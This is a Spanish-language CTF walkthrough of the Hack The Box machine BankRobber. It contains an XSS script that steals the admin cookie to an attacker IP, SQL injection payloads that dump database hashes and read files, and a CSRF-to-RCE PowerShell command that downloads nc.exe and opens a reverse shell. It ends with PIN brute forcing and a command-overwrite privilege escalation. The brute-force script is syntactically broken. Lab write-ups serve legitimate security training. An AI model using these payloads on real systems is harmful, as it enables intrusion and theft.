---
layout: post
title: HTB_BankRobber
date: 2023/07/10
slug: HTB_BankRobber
heroImage: /assets/machines.jpg
---

# BankRobber {-}

## Introduccion {-}

La maquina del dia se llama BankRobber.

El replay del live se puede ver aqui

[![S4vitaar BankRobber maquina](https://img.youtube.com/vi/QaKIzdeEQo4/0.jpg)](https://www.youtube.com/watch?v=QaKIzdeEQo4)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.154
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.154
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.154 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,443,445,3306 10.10.10.154 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 80     | http     | Web Fuzzing        |            |
| 443    | https    | Web Fuzzing        |            |
| 445    | smb      | Null session       |            |
| 3306   | mysql    | Injeccion SQL      |            |


### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.154
smbclient -L 10.10.10.154 -N
smbmap -H 10.10.10.154 -u 'null'
```

Vemos que estamos en frente de una maquina Windows 10 Pro que se llama **BANKROBBER** en el dominio **Bankrobber** con un certificado no firmado.
Tambien vemos que no podemos ver los recursos compartidos a nivel de red con un null session.

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.154
whatweb https://10.10.10.154
```

Es un Apache 2.4.39 Win64 que usa openSSL y PHP 7.3.4 

#### Checkeamos el certificado ssl {-}

```bash
openssl s_client -connect 10.10.10.154:443
```

Aqui no vemos ningun dominio o cosa interesante.

#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.154 
```
, Vemos una pagina que habla de bitcoin y nos permite loggear o registrar. Empezamos por crear una cuenta
y nos loggeamos.

Aqui vemos que podemos transferir E-coin a alguien. Le ponemos

```bash
Amount: 1
ID of Addressee: 1
Comment to him/her: EEEEEEEEEE
```

Si transferimos, aparece una popup que nos dice que 
```bash
 Transfer on hold. An admin will review it within a minute. 
```





#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.34/FUZZ
```

Vemos un directorio 
```bash
 /jailuser 
```
 que lista un directorio 
```bash
 dev 
```
 que contiene ficheros. Nos descargamos estos ficheros.


## Vulnerability Assessment {-}

### XSS {-}

Testeamos que accion puede efectuar el administrador y por el mismo tiempo, si el input de comment es vulnerable a un **XSS**.

1. Nos montamos un servidor web en python

    ```bash
    python3 -m http.server 80
    ```

1. Modificamos los valores de la transferencia

    ```bash
    Amount: 1
    ID of Addressee: 1
    Comment to him/her: <script src="http://10.10.17.51/diamondjackson.jpg"></script>
    ```

Aqui vemos que esta vulnerable a XSS porque recibimos una peticion GET.


La idea aqui seria robar la cookie de session del administrador.

1. Checkeamos nuestra propria cookie de session con Burpsuite


![BakRobber-mycookie](/assets/images/BankRobber-mycookie.png) 
1. Como la cookie esta URL encodeada le damos a Ctrl+Shift+U y copiamos la cookie
1. Analyzamos la cookie

    - Tiene 3 campos, *id* - *username* - *password*
    - Decodificamos el username

        ```bash
        echo "czR2aXRhcg==" | base64 -d; echo
        #Output
        s4vitar
        ```
    
    - Decodificamos el password

        ```bash
        echo "czR2aXRhcjEyMw==" | base64 -d; echo
        #Output
        s4vitar123
        ```

    Aqui vemos que la cookie unicamente esta encryptada en base64.

1. Intentamos robar la cookie del admin.

    - Creamos un fichero test.js

        ```javascript
        var request = new XMLHttpRequest();
        request.open('GET', 'http://10.10.17.51/?cookie='+document.cookie, true);
        request.send();
        ```

    - Creamos un servidor web con python

        ```bash
        python3 -m http.server 80
        ```

    - Modificamos nuevamente los valores de la transferencia
    
        ```bash
        Amount: 1
        ID of Addressee: 1
        Comment to him/her: <script src="http://10.10.17.51/test.js"></script>
        ```

    Aqui ya vemos la cookie de session del administrador.

1. Decodificamos la cookie del admin.

    ```bash
    php --interactive
    php > echo urldecode("username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D")
    #Output
    username=YWRtaW4=; password=SG9wZWxlc3Nyb21hbnRpYw==

    echo "YWRtaW4=" | base64 -d; echo
    #Output
    admin

    echo "SG9wZWxlc3Nyb21hbnRpYw==" | base64 -d; echo
    #Output
    Hopelessromantic
    ```

1. Nos conectamos a la web como el usuario admin.

Hay un link user.txt que nos muestra un mensaje TODO que seria de mover todos los ficheros al Default Xampp folder.
Buscando por internet vemos que este directorio seria 
```bash
 C:\xampp\htdocs 
```
.

En la pagina principal, vemos un panel de administracion. Aqui vemos 2 cosas,

- Un campo que nos permitiria ejecutar comandos en la maquina victima
- Un campo Search users que es en beta. Nos permite buscar usuarios por su ID

El campo para ejecutar comandos no funcciona porque tendriamos que estar loggeado desde la maquina victima atacando este servicio por localhost.
Ademas con Burpsuite, vemos que esta utilidad lanza una peticion a 
```bash
 /admin/backdoorchecker.php 
```
 con un parametro 
```bash
 cmd=... 
```


Como no podemos hacer gran cosa por el momento, analyzamos el campo de busqueda de usuarios.

```bash
1 -> admin
2 -> gio
3 -> s4vitar
1' -> There is a problem with your SQL syntax
```

### SQL Injection {-}

```bash
1' or 1=1-- - 
#Output
1,admin
2,gio
3,s4vitar
```

Seguimos la guia normal de un SQLI

1. Cuantas columnas hay

    ```bash
    1' order by 100-- -         -> There is a problem with your SQL syntax
    1' union select 1,2-- -     -> There is a problem with your SQL syntax
    1' union select 1,2,3-- -
    #Output
    1,admin
    1,2
    ```

    Vemos que hay 3 columnas y vemos la 1 y la 2.

1. Cual es la base de datos

    ```bash
    1' union select 1,database(),3-- -
    #Output
    1,admin
    1,bankrobber
    ```

1. Cual es el usuario que esta actualmente coriendo la base de datos

    ```bash
    1' union select 1,user(),3-- -
    #Output
    1,admin
    1,root@localhost 
    ```

1. Cual es la version de la base de datos

    ```bash
    1' union select 1,version(),3-- -
    #Output
    1,admin
    1,10.1.38-MariaDB
    ```

1. Cual son las otras bases de datos que existen

    ```bash
    1' union select 1,schema_name,3 from information_schema.schemata-- -
    #Output
    1,admin
    1,bankrobber
    1,information_schema
    1,mysql
    1,performance
    1,phpmyadmin
    1,test
    ```

    S4vi nos adelanta que en la base de datos de bankrobber estan unas credenciales de usuarios, pero que no nos sirben porque ya somos admin.
    miramos por la db mysql

1. Buscamos credenciales

    ```bash
    1' union select 1,group_concat(User,0x3a,Password),3 from mysql.user-- -
    #Output
    1,admin
    1,root:*F435735A173757E57BD36B09048B8B610FF4D0C4
    ```

1. Crackeo de hash con john

    ```bash
    echo "root:*F435735A173757E57BD36B09048B8B610FF4D0C4" > credentials.txt
    john --wordlist=/usr/shar/wordlists/rockyou.txt credentials.txt
    ```

    Vemos que no podemos romper el hash

1. Intentamos leer ficheros

    ```bash
    1' union select 1,load_file("C:\\Windows\\System32\\drivers\\etc\\hosts"),3-- -
    ```

    El fichero 
```bash
 \etc\hosts 
```
 no nos interesa en este caso pero hemos podido comprobar si podiamos leer ficheros.


    miramos por el fichero 
```bash
 C:\\xampp\\htdocs\\admin\\backdoorchecker.php 
```
 y podemos ver la manera de ejecutar comandos bypasseando los badchars.


La idea aqui seria de ejecutar un comando de typo 
```bash
 cmd=dir|powershell -c "iwr -uri http://10.10.17.51/nc.exe -Outfile %temp%\\nc.exe";%temp%\\nc.exe -e cmd 10.10.17.51 443 
```
.
El problema aqui sigue siendo el echo de no poder lanzar este comando porque no estamos lanzando esta peticion desde el localhost de la maquina victima.


## Vuln exploit & Gaining Access {-}

### De un XSS a un XSRF par conseguir un RCE para ganar accesso al systema{-}

Esto puede funccionar unicamente si el usuario admin que valida las transacciones esta loggeada al panel de administracion desde la propria maquina victima.

Intentamos y miramos.

1. Creamos un ficher pwned.js

    ```javascript
    var request = new XMLHttpRequest();
    params = 'cmd=dir|powershell -c "iwr -uri http://10.10.17.51/nc.exe -Outfile %temp%\\nc.exe";%temp%\\nc.exe -e cmd 10.10.17.51 443';
    request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
    request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    request.send(params);
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Preparamos el nc.exe y creamos un servidor web con python

    ```bash
    locate nc.exe
    cp /usr/share/sqlninja/apps/nc.exe .
    python3 -m http.server 80
    ```

1. Lanzamos una transaccion

    ```bash
    Amount: 1
    ID of Addressee: 1
    Comment to him/her: <script src="http://10.10.17.51/pwned.js"></script>
    ```

Hemos ganado accesso a la maquina victima como el usuario cortin y podemos visualizar la flag.

```bash
whoami
bankrobber\cortin

type C:\Users\cortin\Desktop\user.txt
```
## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami /priv
```

No tenemos privilegios interesantes como el **SeImpersonatePrivilege**, el **SeLoadPrivilege** o el **SeBackupPrivilege**.
Teniendo este privilegio, podriamos hacer una copia (backup) de seguridad de elemento del systema como el **NTDS** que nos permitirian
recuperar los hashes de los usuarios del systema, entre ellos el usuario Administrator.

```bash
cd C:\Users\Administrator
cd C:\
netstat -nat
```

Aqui vemos un ejecutable llamado 
```bash
 bankv2.exe 
```
. En este caso no lo vamos a analyzar. El **netstat** nos muestra un puerto **910** que no hemos visto
con nmap.

```bash
netstat -ano
tasklist
```

El comando 
```bash
 netstat -ano 
```
 nos permite ver el UID de los puertos abiertos y con el comando 
```bash
 tasklist 
```
, miramos que servicio core para este UID.
En este caso vemos que es el mismo **bankv2.exe**.

Miramos con el **nc.exe** lo que es.

```bash
%temp%\nc.exe 127.0.0.1 910
#Output
Please enter your super secret 4 digit PIN code to login:
```

Como el puerto esta interno a la maquina, vamos a tirar de **chisel** para exponerlo a nuestra maquina de atacante y vamos a bruteforcear el pin con 
un script en python.

1. Descargamos chisel

    ```bash
    wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_windows_amd64.gz
    mv chisel_1.7.6_windows_amd64.gz chisel.exe.gz
    gunzip chisel.exe.gz
    ```

1. Transferimos chisel a la maquina victima

    - Desde la maquina de atacante

        ```bash
        python3 -m http.server 80
        ```

    - Desde la maquina victima

        ```bash
        cd %temp%
        powershell iwr -uri http://10.10.17.51/chisel.exe -OutFile C:\Windows\Temp\chisel.exe
        ```

1. Preparamos el chisel para linux en la maquina de atacante

    ```bash
    git clone https://github.com/jpillora/chisel/
    cd chisel
    go build -ldflags "-s -w" .
    upx chisel

    ./chisel server --reverse --port 1234
    ```

1. Lanzamos el cliente desde la maquina victima

    ```bash
    chisel.exe client 10.10.17.51:1234 R:910:127.0.0.1:910
    ```

Ahora ya tenemos accesso al puerto 910 de la maquina victima desde nuestra maquina. 

Ya podemos crear un script en python para que ataque este puerto. Pero primero creamos un diccionario de pins con crunch

```bash
crunch 4 4 -t %%%% > pins.txt
```

Creamos el 
```bash
 exploit.py 
```


```python
#!/usr/bin/python3

import pdb
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler

def tryPins():
    f = open("pins", "r")

    p1.log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    for pin in f.readlines():
        p1.status(b"Probando con PIN " + pin.strip('\n').encode())

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 910))

        data = s.recv(4096)

        s.send(pin.encode())

        data = s.recv(1024)

        if "Access denied" not in data:
            p1.success(b"El PIN es " + pin.strip('\n').encode())
            sys.exit(0)

if __name__ == '__main__':
    tryPins()
```

Si lanzamos el script, encontramos el pin.

Vemos que podemos ejecutar transferencia de e-coin con este programa, intentamos cosas

```bash
Please enter the amount of e-coins you would like to transfer:
[$] 10
[$] Transfering $10 using our e-coin transfer application.
[$] Executing e-coin transfer tool: C:\Users\Documents\transfer.exe

Please enter the amount of e-coins you would like to transfer:
[$] asfessefseafews
[$] Transfering $asfessefseafews using our e-coin transfer application.
[$] Executing e-coin transfer tool: C:\Users\Documents\transfer.exe

Please enter the amount of e-coins you would like to transfer:
[$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA using our e-coin transfer application.
[$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Aqui no parece que estamos frente a un BufferOverflow pero vemos que a partir de una serie de caracteres, sobre escribimos el ejecutable que permite
enviar los e-coins.

1. Creamos un pattern

    ```bash
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
    #Output
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    ```

1. Lanzamos el ejecutable con esta cadena

    ```bash
    Please enter your super secret 4 digit PIN code to login:
    [$] 0021
    [$] PIN is correct, access granted!
    Please enter the amount of e-coins you would like to transfer:
    [$] Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    [$] Transfering $Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A using our e-coin transfer application.
    [$] Executing e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    ```

1. Miramos el offset

    ```bash
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -q 0Ab1
    #Output
    [+] Exact match at offset 32
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos el binario con el input malicioso

    ```bash
    python -c 'print "A"*32 + "C:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443"'
    #Output
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443

    Please enter your super secret 4 digit PIN code to login:
    [$] 0021
    [$] PIN is correct, access granted!
    Please enter the amount of e-coins you would like to transfer:
    [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443
    [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443 using our e-coin transfer application.
    [$] Executing e-coin transfer tool: C:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443
    ```

Ya vemos que hemos ganado acceso al systema como 
```bash
 nt authority\system 
```
 y podemos ver la flag.
